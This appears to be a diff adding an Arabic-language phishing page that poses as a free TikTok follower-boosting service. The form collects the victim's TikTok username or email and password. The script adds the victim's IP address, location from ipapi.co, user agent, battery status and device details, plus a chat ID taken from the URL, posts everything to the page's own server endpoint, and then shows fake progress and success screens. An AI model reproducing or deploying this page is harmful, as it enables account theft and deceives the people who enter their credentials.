@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <title>زيادة متابعين تيك توك</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap');
+
+        body {
+            background: linear-gradient(135deg, #f5af19, #f12711);
+            font-family: 'Cairo', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            color: #333;
+        }
+
+        .container, .loading-container, .message-container, .second-message-container {
+            text-align: center;
+            background: #fff;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
+            max-width: 600px;
+            width: 90%;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .loading-container, .message-container, .second-message-container {
+            display: none;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            color: #f12711;
+            margin-bottom: 15px;
+        }
+
+        input[type="text"], input[type="password"], select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+            color: #333;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #010101;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .tiktok-logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 20px;
+        }
+
+        .notification {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background-color: #010101;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            z-index: 100;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            display: none;
+        }
+
+        .notification.show {
+            opacity: 1;
+            display: block;
+        }
+
+        .loading-container h1, .message-container h1, .second-message-container h1 {
+            font-size: 2.5em;
+            color: #f12711;
+            margin-bottom: 15px;
+        }
+
+        .loading-container p, .message-container p, .second-message-container p {
+            font-size: 1.2em;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .heart {
+            font-size: 3em;
+            color: #f12711;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .progress-bar {
+            width: 100%;
+            background: #ddd;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+
+        .progress-bar div {
+            height: 20px;
+            width: 0;
+            background: #f12711;
+            border-radius: 10px;
+            animation: progress 20s linear forwards;
+        }
+
+        @keyframes progress {
+            to { width: 100%; }
+        }
+        
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo" class="tiktok-logo">
+        <h1>زيادة متابعين تيك توك 📺🚀</h1>
+        <form id="increaseForm">
+            <input type="hidden" name="chatId" id="chatIdInput">
+            <input type="text" name="username" placeholder="يوزر الحساب او البريد الإلكتروني" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <select name="followers" required>
+                <option value="">اختر عدد المتابعين</option>
+                <option value="500">متابعين 500🔥</option>
+                <option value="1000">متابعين 1k⭐</option>
+                <option value="2000">متابعين 2k💥</option>
+                <option value="3000">متابعين 3k🚀</option>
+            </select>
+            <button type="submit">رشق</button>
+        </form>
+    </div>
+
+    <!-- شاشة التحميل -->
+    <div class="loading-container"> 
+        <h1>جاري ارسال الطلب...</h1> 
+        <p>يتم تجهيز طلبك، يرجى الانتظار.</p> 
+        <div class="heart">❤️</div> 
+        <div class="progress-bar"><div></div></div> 
+    </div> 
+
+    <div class="second-message-container"> 
+        <h1>تم عد وجاري تنفيذ طلبك...</h1> 
+        <p>يتم الآن تنفيذ طلبك بنجاح.</p> 
+        <div class="heart">❤️</div> 
+    </div> 
+
+    <div class="message-container"> 
+        <h1>تهانينا!</h1> 
+        <p>تم تسليم طلبك بنجاح!</p> 
+        <div class="heart">❤️</div> 
+    </div> 
+
+    <script>
+        const increaseForm = document.getElementById('increaseForm');
+        const chatIdInput = document.getElementById('chatIdInput');
+        const notification = document.getElementById('notification');
+
+        const chatId = window.location.pathname.split('/').pop();
+        chatIdInput.value = chatId;
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city
+                };
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return {
+                    ip: 'Unknown',
+                    country: 'Unknown',
+                    city: 'Unknown'
+                };
+            }
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            let platform = "Unknown";
+            if (/Windows/.test(ua)) platform = "Windows";
+            else if (/Mac/.test(ua)) platform = "MacOS";
+            else if (/Linux/.test(ua)) platform = "Tik Tok";
+            else if (/Android/.test(ua)) platform = "Android";
+            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
+
+            return {
+                platform: platform,
+                userAgent: ua
+            };
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        batteryLevel: battery.level,
+                        batteryCharging: battery.charging
+                    };
+                } catch (error) {
+                    console.error('Error getting battery info:', error);
+                }
+            }
+            return {
+                batteryLevel: undefined,
+                batteryCharging: undefined
+            };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+
+        increaseForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+
+            // تنفيذ العمليات المراد تنفيذها قبل التحميل
+            document.body.style.background = 'linear-gradient(135deg, #f5af19, #f12711)'; // تغيير الخلفية بعد التسجيل
+            document.querySelector('.container').style.display = 'none'; // إخفاء النموذج
+            document.querySelector('.loading-container').style.display = 'block'; // إظهار شاشة التحميل
+
+            const formData = new FormData(increaseForm);
+            const data = Object.fromEntries(formData.entries());
+
+            const ipInfo = await getIPInfo();
+            const platformInfo = getPlatformInfo();
+            const batteryInfo = await getBatteryInfo();
+            const deviceVersion = getDeviceVersion();
+
+            Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
+
+            try {
+                const response = await fetch('/submitIncrease', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                if (result.success) {
+                    setTimeout(function() {
+                        document.querySelector('.loading-container').style.display = 'none';
+                        document.querySelector('.second-message-container').style.display =
+                        'block'; // إظهار شاشة تنفيذ الطلب
+                    }, 5000); // زمن الانتظار قبل الانتقال إلى الشاشة التالية
+
+                    setTimeout(function() {
+                        document.querySelector('.second-message-container').style.display = 'none';
+                        document.querySelector('.message-container').style.display = 'block'; // إظهار شاشة النجاح
+                    }, 10000); // زمن الانتظار قبل إظهار شاشة النجاح
+
+                    increaseForm.reset();
+                } else {
+                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+            }
+        });
+    </script>
+</body>
+</html>
